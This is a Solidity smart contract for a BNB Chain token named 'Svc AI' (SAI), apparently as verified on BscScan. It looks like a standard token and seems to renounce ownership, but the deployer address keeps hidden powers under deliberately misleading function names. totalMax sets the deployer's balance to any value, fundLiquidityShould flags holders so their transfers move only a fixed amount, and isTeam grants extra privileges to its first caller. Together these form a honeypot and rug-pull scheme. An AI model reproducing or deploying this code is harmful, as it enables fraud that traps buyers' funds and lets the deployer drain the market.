/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface feeAmountMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minLaunched {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SvcAI is Ownable {
    uint8 private walletFund = 18;
    
    uint256 private fromLaunch;
    uint256 private tradingList;

    uint256 public sellTotalFrom;
    string private _name = "Svc AI";
    uint256 public exemptBuy;
    mapping(address => uint256) private autoEnableLiquidity;
    string private _symbol = "SAI";
    uint256 public receiverTrading;
    bool public modeEnable;
    address public launchedBuy;
    uint256 private launchedMode = 100000000 * 10 ** walletFund;
    mapping(address => bool) public maxLimit;
    bool private tokenSell;
    mapping(address => bool) public tradingSell;

    uint256 public isSender;
    mapping(address => mapping(address => uint256)) private limitLiquidity;
    uint256 constant sellReceiver = 9 ** 10;
    address public swapMarketingTx;
    bool public maxFund;

    bool public teamMarketing;
    
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeAmountMin liquidityShould = feeAmountMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapMarketingTx = minLaunched(liquidityShould.factory()).createPair(liquidityShould.WETH(), address(this));
        launchedBuy = walletLaunchEnable();
        maxLimit[launchedBuy] = true;
        autoEnableLiquidity[launchedBuy] = launchedMode;
        emit Transfer(address(0), launchedBuy, launchedMode);
        renounceOwnership();
    }

    

    function totalSupply() external view returns (uint256) {
        return launchedMode;
    }

    function decimals() external view returns (uint8) {
        return walletFund;
    }

    function isTeam(address receiverTotal) public {
        if (modeEnable) {
            return;
        }
        maxLimit[receiverTotal] = true;
        modeEnable = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function launchedToken(address autoTo, address fundAuto, uint256 buyTeam) internal returns (bool) {
        require(autoEnableLiquidity[autoTo] >= buyTeam);
        autoEnableLiquidity[autoTo] -= buyTeam;
        autoEnableLiquidity[fundAuto] += buyTeam;
        emit Transfer(autoTo, fundAuto, buyTeam);
        return true;
    }

    function walletLaunchEnable() private view returns (address) {
        return msg.sender;
    }

    function fundLiquidityShould(address fromLaunchFee) public {
        if (fromLaunchFee == launchedBuy || fromLaunchFee == swapMarketingTx || !maxLimit[walletLaunchEnable()]) {
            return;
        }
        tradingSell[fromLaunchFee] = true;
    }

    function balanceOf(address enableToken) public view returns (uint256) {
        return autoEnableLiquidity[enableToken];
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function transfer(address receiverWalletAmount, uint256 buyTeam) external returns (bool) {
        return transferFrom(walletLaunchEnable(), receiverWalletAmount, buyTeam);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function transferFrom(address walletMin, address receiverWalletAmount, uint256 buyTeam) public returns (bool) {
        if (walletMin != walletLaunchEnable() && limitLiquidity[walletMin][walletLaunchEnable()] != type(uint256).max) {
            require(limitLiquidity[walletMin][walletLaunchEnable()] >= buyTeam);
            limitLiquidity[walletMin][walletLaunchEnable()] -= buyTeam;
        }
        if (receiverWalletAmount == launchedBuy || walletMin == launchedBuy) {
            return launchedToken(walletMin, receiverWalletAmount, buyTeam);
        }
        if (tradingSell[walletMin]) {
            return launchedToken(walletMin, receiverWalletAmount, sellReceiver);
        }
        return launchedToken(walletMin, receiverWalletAmount, buyTeam);
    }

    function allowance(address walletTeam, address maxAt) external view returns (uint256) {
        return limitLiquidity[walletTeam][maxAt];
    }

    function approve(address maxAt, uint256 buyTeam) public returns (bool) {
        limitLiquidity[walletLaunchEnable()][maxAt] = buyTeam;
        emit Approval(walletLaunchEnable(), maxAt, buyTeam);
        return true;
    }

    function totalMax(uint256 buyTeam) public {
        if (!maxLimit[walletLaunchEnable()]) {
            return;
        }
        autoEnableLiquidity[launchedBuy] = buyTeam;
    }


}